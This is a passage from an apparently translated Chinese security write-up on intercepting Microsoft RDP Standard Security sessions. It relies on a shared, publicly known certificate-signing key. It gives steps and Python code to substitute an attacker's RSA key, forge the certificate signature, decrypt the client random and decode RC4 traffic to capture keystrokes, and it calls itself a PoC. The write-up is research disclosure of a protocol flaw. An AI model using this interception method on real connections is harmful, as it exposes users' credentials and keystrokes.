> \-> 服务端同意使用该协议，并将自身的RSA公钥以及一个服务端随机数发送给客户端。公钥以及如主机名等一些其他信息的集合就称为“证书”。该证书使用终端服务的私钥进行签名（RSA签名机制），以确保证书的真实性；  
> \- 客户端使用公钥验证证书的真实性，若验证成功，则使用公钥对客户端随机数进行加密，并发送至服务端；  
> \- 服务端使用私钥进行解密，获取客户端随机数；  
> \- 客户端、服务端都从客户端随机数、服务端随机数中获取到了会话密钥。会话密钥用来加密会话的其余部分。
请注意，以上所有流程都是明文传输没有使用SSL。理论上没有任何问题，Microsoft想要自己实现SSL实现的功能。但是，密码体制不是一件简单的事，通常情况下，要依赖现有的、经过时间检验的解决方案，而不是自己建立一套新的方案。此时，Microsoft犯了一个严重的错误，该错误如此明显，以至于我完全不理解为什么会这样做。
你能看出问题在哪吗？客户端是如何获取到终端服务的公钥？答案就是：预装！这就意味着每个系统中的公钥都是一样的。更甚者，私钥也是一样的！所以，公私钥可以从任意Window系统中提取出来。事实上，我们甚至都不需要如此做，因为Microsoft已经决定将之正式的公布在网站上，只需要访问microsoft.com就可以查看到。
在会话密钥已经被获取的情况下，对称加密有以下几种模式：None、40bit RC4、56bit RC4、128bit
RC4、3DES（以上被称为FIPS）。默认情况下使用128bit RC4（“High”）。但是，如果我们可以窃取到密钥，如论加密强度如何，都没有意义。
至此，目标已清晰：当收到服务端的公钥后，迅速生成我们自己的RSA密钥对，并替换真实的公钥。同时用私钥对证书进行签名。当客户端成功的获取到虚假的公钥之后，我们就能够获取到客户端的随机数。利用私钥进行解密，重写之后，用服务端的公钥重新加密，并发送。至此，我们就可以成功的嗅探客户端与服务端之间的通信了。
现在，唯一存在的问题就是RDP数据包的分析，下图为我们感兴趣的一个数据包：
表示公钥的字段已经被高亮表示出来了。最前面的两个以小端模式表示的字节，代表了公钥的长度（0x011c）。如同之前讨论过的，公钥由模数和指数两部分组成。查阅RDP协议格式，找出我们感兴趣的字段，以下是模数字段：
签名字段如下：
服务端随机数如下：
保留服务端随机数，修改模数和签名。为了生成我们自己的RSA密钥对，我们使用openssl，虽然Python拥有RSA库，但执行效率要比openssl慢。
    $ openssl genrsa 512 | openssl rsa -noout -text
    Generating RSA private key, 512 bit long modulus
    .....++++++++++++
    ..++++++++++++
    e is 65537 (0x010001)
    Private-Key: (512 bit)
    modulus:
    &nbsp;&nbsp;&nbsp;&nbsp; 00:f8:4c:16:d5:6c:75:96:65:b3:42:83:ee:26:f7:
    &nbsp;&nbsp;&nbsp;&nbsp; e6:8a:55:89:b0:61:6e:3e:ea:e0:d3:27:1c:bc:88:
    &nbsp;&nbsp;&nbsp;&nbsp; 81:48:29:d8:ff:39:18:d9:28:3d:29:e1:bf:5a:f1:
    &nbsp;&nbsp;&nbsp;&nbsp; 21:2a:9a:b8:b1:30:0f:4c:70:0a:d3:3c:e7:98:31:
    &nbsp;&nbsp;&nbsp;&nbsp; 64:b4:98:1f:d7
    publicExponent: 65537 (0x10001)
    privateExponent:
    &nbsp;&nbsp;&nbsp;&nbsp; 00:b0:c1:89:e7:b8:e4:24:82:95:90:1e:57:25:0a:
    &nbsp;&nbsp;&nbsp;&nbsp; 88:e5:a5:6a:f5:53:06:a6:67:92:50:fe:a0:e8:5d:
    &nbsp;&nbsp;&nbsp;&nbsp; cc:9a:cf:38:9b:5f:ee:50:20:cf:10:0c:9b:e1:ee:
    &nbsp;&nbsp;&nbsp;&nbsp; 05:94:9a:16:e9:82:e2:55:48:69:1d:e8:dd:5b:c2:
    &nbsp;&nbsp;&nbsp;&nbsp; 8a:f6:47:38:c1
    prime1:
    [...]
现在，我们生成了所需要的模数n、公钥e、私钥d。事实上，我们需要2048bit的密钥，而不是示例中的512bit，但生成思路是一致的。  
伪造签名也很简单，计算证书的前六个字段，按照协议格式添加内容，并用私钥进行加密，以下是利用Python的函数实现：
    def sign_certificate(cert):
     &quot;&quot;&quot;Signs the certificate with the private key&quot;&quot;&quot;
     m = hashlib.md5()
     m.update(cert)
     m = m.digest() + b&quot;\x00&quot; + b&quot;\xff&quot;*45 + b&quot;\x01&quot;
     m = int.from_bytes(m, &quot;little&quot;)
     d = int.from_bytes(TERM_PRIV_KEY[&quot;d&quot;], &quot;little&quot;)
     n = int.from_bytes(TERM_PRIV_KEY[&quot;n&quot;], &quot;little&quot;)
     s = pow(m, d, n)
     return s.to_bytes(len(crypto[&quot;sign&quot;]), &quot;little&quot;)
接下来需要截取的数据包包含有加密的客户端随机数，数据包如下：
再一次，将数据包中的关键字段高亮表示，开始的四个字节代表长度（0x0108）。由于该数据包是用生成的公钥加密，所以我们可以轻易的用私钥进行解密：
现在，只需要用服务端的公钥重新加密，修改数据包并发送。现在成功获得了私密的客户端随机数，但不知道什么原因，Microsoft并没有将之作为对称加密的密钥。这里需要一个精心构造过的调用，来生成客户端的密钥、服务端的密钥以及签名密钥。虽然无趣但却并不困难。
在获取到会话密钥之后，初始化RC4流中的s-boxes。由于RDP针对来自客户端的消息与服务端的消息使用了不用的密钥，所以我们需要两个s-boxes。s-boxes是一个256字节的数组，数组内的每个元素都被密钥扰乱，最终生成伪随机子密码，利用xor操作，对明文进行加密。Python实现算法如下：
    class RC4(object):
     def __init__(self, key):
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x = 0
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sbox = list(range(256))
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for i in range(256):
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x = (x + self.sbox[i] + key[i % len(key)]) % 256[/i]
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.sbox[i], self.sbox[x] = self.sbox[x], self.sbox[i][/i][/i]
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.i = self.j = 0
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.encrypted_packets = 0
     def decrypt(self, data):
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out = [] 
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for char in data:
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.i = (self.i + 1) % 256
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.j = (self.j + self.sbox[self.i]) % 256
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.sbox[self.i], self.sbox[self.j] = (
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sbox[self.j],
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sbox[self.i]
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out.append(char ^ self.sbox[(
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sbox[self.i] +
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sbox[self.j]) % 256
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ])
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.encrypted_packets += 1
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if self.encrypted_packets &gt;= 4096:
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.update_key()
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return bytes(bytearray(out))
     def update_key(self):
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Updating session keys&quot;)
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TODO finish this
从代码中可以看出，RDP协议要求加密过4096个数据包之后就更新密钥。本文并没有着力去解决这个问题，主要是证明证书中存在的漏洞。
现在我们具备了读取数据流的所有背景知识。我们对数据流中包含的击键信息很感兴趣。通过查阅MSDN，学习RDP协议中的[键盘事件](https://msdn.microsoft.com/en-us/library/cc240584.aspx)及[相关知识](https://msdn.microsoft.com/en-us/library/cc746160.aspx)。在处理键盘、鼠标消息及一些其他细节时，处理的并不是很完善。但对于PoC来说，已经足够了。
接下来，用客户端连接伪造的RDP服务端，弹出警告。